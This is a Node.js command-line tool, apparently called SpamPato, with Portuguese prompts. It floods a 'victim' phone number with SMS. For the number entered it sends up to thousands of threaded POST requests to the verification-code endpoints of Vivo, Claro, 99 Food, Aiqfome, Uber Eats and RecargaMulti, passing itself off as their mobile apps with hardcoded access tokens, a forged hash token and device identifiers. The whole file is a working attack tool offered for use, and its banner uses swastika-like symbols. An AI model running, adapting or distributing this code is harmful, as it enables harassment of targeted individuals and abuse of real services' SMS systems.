const cliProgress = require('cli-progress');
const readLine = require('readline-sync');
const tools = require('./tools');
const color = require('colors');
var crypto = require('crypto');
const spam = {}

spam.enviados = 0;

// Colors message.
color.setTheme({
  silly: 'rainbow',
  yellow: 'yellow',
  success: ['brightGreen', 'bold'],
  help: ['brightCyan', 'bold'],
  warn: ['brightYellow', 'bold'],
  info: ['brightBlue', 'bold'],
  error: ['brightRed', 'bold']
});

// Criar ProogressBar.
const b1 = new cliProgress.SingleBar({
	format: color.brightRed('S: |' + color.brightGreen('{bar}') + '| {percentage}% » Enviados: {enviados}'),
	barCompleteChar: '\u2588',
	barIncompleteChar: '\u2591',
	hideCursor: true
});

// Fazer verificação do numero, quantidade e threads.
function startBypass(numero, quantidade, limite, threads, threadslimite) {
	if (isNaN(numero)) {
		process.exit(console.log('Opa, erro code "523", pelo visto vc colocou um numero de vitima errado, (obs: Coloque o numero sem "+" ou "55 no "inicio").'.error));
	}
	if (numero.length != 11) {
		process.exit(console.log('Opa, erro code "523", pelo visto vc colocou um numero de vitima errado, (obs: Coloque o numero sem "+" ou "55 no "inicio").'.error));
	}
	if (isNaN(quantidade)) {
		process.exit(console.log('Quantidade invalida.'.error));
	}
	if (quantidade > limite) {
		process.exit(console.log('você colocou uma quantidade não permitida limite maximo (%s).'.error, limite));
	}
	if (threads > threadslimite) {
		process.exit(console.log('quantidade de threads não permitida limite maximo (%s).'.error, threadslimite));
	}
	if (threads > 1) {
		console.log('\nOla, O spam ja esta em andamento, agora e so aquardar em quanto faço o envio.'.error);
	}
}

// Enviar SMS (API) [ Vivo ].
async function op1(numero, quantidade) {
	
	var vivo = await tools.curl('https://login.vivo.com.br/mobile/br/com/vivo/mobile/portlets/loginmobile/sendTokenRequest.do', 'numero='+numero, {
		'Host': 'login.vivo.com.br',
		'Connection': 'keep-alive',
		'Accept': '*/*',
		'X-Requested-With': 'XMLHttpRequest',
		'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Origin': 'https://login.vivo.com.br',
		'Sec-Fetch-Site': 'same-origin',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://login.vivo.com.br/mobile/appmanager/env/publico'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["code"] == 0) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else if (response["code"] == 101) {
				console.clear();
				process.exit(console.log('Erro » [ Ops, o %s não corresponde a operadora Vivo. ] Ass: PatoMaker'.error, numero));
			} else if (response["code"] == 106) {
				console.clear();
				process.exit(console.log('Falhou » [ Cliente com uma linha desativada. ] Ass: PatoMaker'.error));
			} else if (response["code"] == 109) {
				console.clear();
				process.exit(console.log('Falhou » [ Cliente com uma linha cancelada. ] Ass: PatoMaker'.error));
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido (%s). ] Ass: PatoMaker'.error, response["code"]));
			}
	});
	
	// Verificar se o spam ja foi finalizado.
	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nSucesso >>> Atake Finalizado irmao, Obrigado por usar o SpamPato V1'.help));
	} else {
		op1(numero, quantidade);
	}
	
}

// Enviar SMS (API) [ Claro ].
async function op2(numero, quantidade) {
	
	var claro = await tools.curl('https://claro-recarga-api.m4u.com.br/sms-tokens/', `{"msisdn":"${numero}","target":"token","origin":"login"}`, {
		'Host': 'claro-recarga-api.m4u.com.br',
		'Connection': 'keep-alive',
		'Accept': 'application/json, text/plain, */*',
		'Channel': 'CLARO_WEB_DESKTOP',
		'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
		'Content-Type': 'application/json',
		'Origin': 'https://clarorecarga.claro.com.br',
		'Sec-Fetch-Site': 'cross-site',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://clarorecarga.claro.com.br/recarga/login'
		}, 'POST').then((res) => {
			if (res.statusCode == 204) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	
	// Verificar se o spam ja foi finalizado.
	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nSucesso >>> Atake Finalizado irmao, Obrigado por usar o SpamPato V1'.help));
	} else {
		op2(numero, quantidade);
	}
	
}

// Enviar SMS (API) [ 99 Food ].
async function op3(numero, quantidade) {
	
	var food99 = await tools.curl('https://epassport.didiglobal.com/passport/login/v5/codeMT', 'q=%7B%22cell%22%3A%22'+numero+'%22%2C%22code_type%22%3A0%2C%22api_version%22%3A%221.0.2%22%2C%22app_version%22%3A%221.2.46%22%2C%22appid%22%3A50032%2C%22canonical_country_code%22%3A%22BR%22%2C%22channel%22%3A%220%22%2C%22city_id%22%3A0%2C%22country_calling_code%22%3A%22%2B55%22%2C%22country_id%22%3A76%2C%22device_name%22%3A%22r5q%22%2C%22imei%22%3A%22b03a06ea835db9acbcfb37b874abdcc1A0A70271E2E8064991A49111D5BCFC8B%22%2C%22lang%22%3A%22pt-BR%22%2C%22lat%22%3A0.0%2C%22lng%22%3A0.0%2C%22model%22%3A%22SM-G770F%22%2C%22network_type%22%3A%22WIFI%22%2C%22omega_id%22%3A%22CDrEB7bwQYmIR4AvLLoe3g%22%2C%22os%22%3A%2210%22%2C%22role%22%3A1%2C%22scene%22%3A1%2C%22suuid%22%3A%22CE830195FA71CA10E08876DA6AB79268%22%2C%22utcoffset%22%3A0%7D', {
		'User-Agent': 'Android/10 didihttp OneNet/2.1.0.94 com.xiaojukeji.didi.brazil.customer/1.2.46',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Transfer-Encoding': 'chunked',
		'Host': 'epassport.didiglobal.com',
		'Connection': 'Keep-Alive'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["errno"] == 0) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else if (response["errno"] == 40001) {
				console.clear();
				process.exit(console.log('Falhou » [ Número de telefone com formato inválido. ] Ass: PatoMaker'.error));
			} else if (response["errno"] == 53001) {
				console.clear();
				process.exit(console.log('Falhou » [ Excesso de tentativas, tente novamente em breve. ] Ass: PatoMaker'.error));
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	
	// Verificar se o spam ja foi finalizado.
	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nSucesso >>> Atake Finalizado irmao, Obrigado por usar o SpamPato V1'.help));
	} else {
		op3(numero, quantidade);
	}
	
}

// Enviar SMS (API) [ Aiqfome ].
async function op4(numero, quantidade) {
	
	var token = crypto.createHash("sha1").update('aqf**@@Token123_+55'+numero, "binary").digest("hex");
	
	var aiqfome = await tools.curl('https://edivaldo.aiqfome.com/verificacaoNumero/iniciarVerificacao', 'usuario_id=2437702&numero_destino=%2B55'+numero+'&token_numero='+token+'&plataforma=android&versao_app=0.6.8&token=679a3efc5faa5dda6d73254813d84951cb860635&pais_id=1', {
		'Connection': 'Keep-Alive',
		'Content-Type': 'application/x-www-form-urlencoded',
		'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G770F Build/QP1A.190711.020)',
		'Host': 'edivaldo.aiqfome.com'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["error"] == false) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	
	// Verificar se o spam ja foi finalizado.
	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nSucesso >>> Atake Finalizado irmao, Obrigado por usar o SpamPato V1'.help));
	} else {
		op4(numero, quantidade);
	}
	
}

// Enviar SMS (API) [ Uber Eats ].
async function op5(numero, quantidade) {
	
	var ubereats = await tools.curl('https://cn-phx2.cfe.uber.com/rt/silk-screen/submit-form', `{"formContainerAnswer":{"formAnswer":{"flowType":"INITIAL","screenAnswers":[{"screenType":"PHONE_NUMBER_INITIAL","fieldAnswers":[{"fieldType":"PHONE_COUNTRY_CODE","phoneCountryCode":"55"},{"fieldType":"PHONE_NUMBER","phoneNumber":"${numero}"},{"fieldType":"THIRD_PARTY_CLIENT_ID","thirdPartyClientID":""}]}],"firstPartyClientID":""}}}`, {
		'Host': 'cn-phx2.cfe.uber.com',
		'x-uber-client-name': 'eats',
		'x-uber-device': 'android',
		'x-uber-device-language': 'pt_BR',
		'x-uber-client-version': '1.277.10005',
		'accept': 'application/json',
		'content-type': 'application/json; charset=UTF-8',
		'user-agent': 'okhttp/3.12.0-uber2'
		}, 'POST').then((res) => {
			if (res.body.match(/SIGN_IN/i)) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else if (res.body.match(/SMS_OTP_TOO_MANY_REQUESTS/i)) {
				console.clear();
				process.exit(console.log('Falhou » [ Excesso de tentativas, tente novamente em breve. ] Ass: PatoMaker'.error));
			} else if (res.body.match(/BANNED/)) {
				console.clear();
				process.exit(console.log('Falhou » [ Numero inserido está com conta desativada. ] Ass: PatoMaker'.error));
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	
	// Verificar se o spam ja foi finalizado.
	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nSucesso >>> Atake Finalizado irmao, Obrigado por usar o SpamPato V1'.help));
	} else {
		op5(numero, quantidade);
	}
	
}

// Enviar SMS (API) [ RecargaMulti ].
async function op6(numero, quantidade) {
	
	var recargamulti = await tools.curl('https://cce-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.0',
		'X-MIP-CHANNEL': 'CCEANDROID',
		'X-MIP-ACCESS-TOKEN': '728D6030-35A9-CCCE-AD19-A773CE0E4769',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'cce-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
				// TOO_MANY_REQUESTS
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	
	tools.sleep(2000);
	var recargamulti2 = await tools.curl('https://brightstar-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.0',
		'X-MIP-CHANNEL': 'BRIGHTSTARANDROID',
		'X-MIP-ACCESS-TOKEN': 'F917BC34-BB7C-4308-BAEB-62E72DB5EE42',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'brightstar-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
				// TOO_MANY_REQUESTS
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	
	tools.sleep(2000);
	var recargamulti3 = await tools.curl('https://multirecarga-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.1',
		'X-MIP-CHANNEL': 'MULTIRECARGAANDROID',
		'X-MIP-ACCESS-TOKEN': '385D5040-8414-11E5-A837-0800200C9A66',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'multirecarga-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
				// TOO_MANY_REQUESTS
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	
	tools.sleep(2000);
	var recargamulti4 = await tools.curl('https://alcatel-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.0',
		'X-MIP-CHANNEL': 'ALCATELANDROID',
		'X-MIP-ACCESS-TOKEN': '242D4F54-0D61-41F2-998F-EF4D57AAA060',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'alcatel-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
				// TOO_MANY_REQUESTS
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	tools.sleep(2000);
	var recargamulti6 = await tools.curl('https://samsung-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.0',
		'X-MIP-CHANNEL': 'ALCATELANDROID',
		'X-MIP-ACCESS-TOKEN': '2A5DE230-3DAB-4E65-A65B-70CC698D5DEB',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'samsung-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
				// console.log('Sucesso » [ Numero: %s, Enviados: %s, Retorno: SMS enviado com sucesso. ] Ass: PatoMaker'.success, numero, spam.enviados);
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
				// TOO_MANY_REQUESTS
			} else {
				console.clear();
				process.exit(console.log('Falhou » [ Ocorreu um error desconhecido. ] Ass: PatoMaker'.error));
			}
	});
	
	// Verificar se o spam ja foi finalizado.
	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nSucesso >>> Atake Finalizado irmao, Obrigado por usar o SpamPato V1'.help));
	} else {
		op6(numero, quantidade);
	}
	
}

// Options (Menu de comando).
function options() {
	console.clear();
	
	console.log('_─卐_─卐_─卐_─卐_─卐_─卐_─卐_─卐_─卐☹\n');
	console.log(' _____                          ______         _  ☹       '.error)
	console.log('/  ___|                         | ___         | |         '.error)
	console.log('  `--.  _ __    __ _  _ __ ___  | |_/ /  __ _ | |_   ___  '.error)
	console.log(" `--.    '_    / _` || '_ ` _   |  __/  / _` || __| / _   ".error)
	console.log("/ __/ /| |_) || (_| || | | | | || |    | (_| || |_ | (_) |".error)
	console.log(" ____/ | .__/   __,_||_| |_| |_| _|      __,_||___|  ___/ ".error)
	console.log("       | |                                                ".error)
	console.log("       |_|             ☹                                  ".error)
   	console.log('         ☹                   Mᴇʟʜᴏʀ Sᴘᴀᴍ Dᴇ Sᴍs V3\n'.help);
	
	console.log('_─卐_─卐_─卐_─卐_─卐_─卐_─卐_─卐_─卐\n'.success);
	console.log('┌»Escolha A sua opçao de 0 a 6 ┐»☹'.success)
	console.log('├»[1] » Spam Vivo              │»☹'.success);
	console.log('├»[2] » Spam Claro             │»☹'.success);
	console.log('├»[3] » Spam 99 Food           │»☹'.success);
	console.log('├»[4] » Spam AiqFome           │»☹'.success);
	console.log('├»[5] » Spam Uber Eats         │»☹'.success);
	console.log('├»[6] » Spam RecargaMulti      │»☹'.success);
	console.log('└┐                            ┌┘»☹'.success);
	console.log(' └»[0] » Sair               ﾒ ┘'.success);
	return readLine.question('Qual Opçao? (0 a 6): '.error);
}

spam.option = options();

if (spam.option == 1) {
	
	console.log('\nVocê selecionou a opção [ %s | Vivo ]\n'.success, spam.option);
	var numero = readLine.question('-» Qual numkero da vitima? (sem 55): '.warn).replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('-» Quantos SMS quer enviar max (5000): '.warn);
	var threads = readLine.question('Quantos threads você quer utilizar max (10): '.warn);
	
	startBypass(numero, quantidade, 5000, threads, 10); // Iniciar bypass
	
	console.log("\nOpa irmao, Emviando:『 %s 』 SMS para o numero『 %s 』, aguarde...\n".help, quantidade, numero);
	
	for (var i = 0; i < threads; i++) {
		op1(numero, quantidade); // Iniciar spam
	}

} else if (spam.option == 2) {
	
	console.log('\nVocê selecionou a opção [ %s | Claro ]\n'.success, spam.option);
	var numero = readLine.question('Informe o numero da vitima: '.warn).replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('Quantos SMS quer enviar max (5000): '.warn);
	var threads = readLine.question('Quantos threads você quer utilizar max (10): '.warn);
	
	startBypass(numero, quantidade, 5000, threads, 10); // Iniciar bypass
	
	console.log("\nOpa irmao, Emviando:『 %s 』 SMS para o numero『 %s 』, aguarde...\n".help, quantidade, numero);
	
	for (var i = 0; i < threads; i++) {
		op2(numero, quantidade); // Iniciar spam
	}
	
} else if (spam.option == 3) {
	
	console.log('\nVocê selecionou a opção [ %s | 99 Food ]\n'.success, spam.option);
	console.log('Atenção: está api contem limite de 10 SMS por numero.\n'.error);
	var numero = readLine.question('Informe o numero da vitima: '.warn).replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('Quantos SMS quer enviar max (10): '.warn);
	
	startBypass(numero, quantidade, 10, 0, 0); // Iniciar bypass
	
	console.log("\nOpa irmao, Emviando:『 %s 』 SMS para o numero『 %s 』, aguarde...\n".help, quantidade, numero);
	
	for (var i = 0; i < 1; i++) {
		op3(numero, quantidade); // Iniciar spam
	}
	
} else if (spam.option == 4) {
	
	console.log('\nVocê selecionou a opção [ %s | Aiqfome ]\n'.success, spam.option);
	var numero = readLine.question('Informe o numero da vitima: '.warn).replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('Quantos SMS quer enviar max (500): '.warn);
	var threads = readLine.question('Quantos threads você quer utilizar max (10): '.warn);
	
	startBypass(numero, quantidade, 500, threads, 10); // Iniciar bypass
	
	console.log("\nOpa irmao, Emviando:『 %s 』 SMS para o numero『 %s 』, aguarde...\n".help, quantidade, numero);
	
	for (var i = 0; i < threads; i++) {
		op4(numero, quantidade); // Iniciar spam
	}
	
} else if (spam.option == 5) {
	
	console.log('\nVocê selecionou a opção [ %s | Uber Eats ]\n'.success, spam.option);
	console.log('Atenção: está api contem limite de 9 SMS por numero.\n'.error);
	var numero = readLine.question('Informe o numero da vitima: '.warn).replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('Quantos SMS quer enviar max (9): '.warn);
	
	startBypass(numero, quantidade, 9, 0, 0); // Iniciar bypass
	
	console.log("\nOpa irmao, Emviando:『 %s 』 SMS para o numero『 %s 』, aguarde...\n".help, quantidade, numero);
	
	for (var i = 0; i < 1; i++) {
		op5(numero, quantidade); // Iniciar spam
	}
	
} else if (spam.option == 6) {
	
	console.log('\nVocê selecionou a opção [ %s | RecargaMulti ]\n'.success, spam.option);
	var numero = readLine.question('Informe o numero da vitima: '.warn).replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('Quantos SMS quer enviar max (1000): '.warn);
	
	startBypass(numero, quantidade, 1000, 0, 0); // Iniciar bypass
	
	console.log("\nOpa irmao, Emviando:『 %s 』 SMS para o numero『 %s 』, aguarde...\n".help, quantidade, numero);
	
	for (var i = 0; i < 1; i++) {
		op6(numero, quantidade); // Iniciar spam
	}
} else if (spam.option == 7) {
	console.log('Criador: PatoMaker'.success)
} else if (spam.option == 0) {
	process.exit(console.log('Tudo bem! saindo...'.error)); // Finalizar processo.
} else {
	console.log("Ops! parece que você informou uma opção inválida.".error);
}
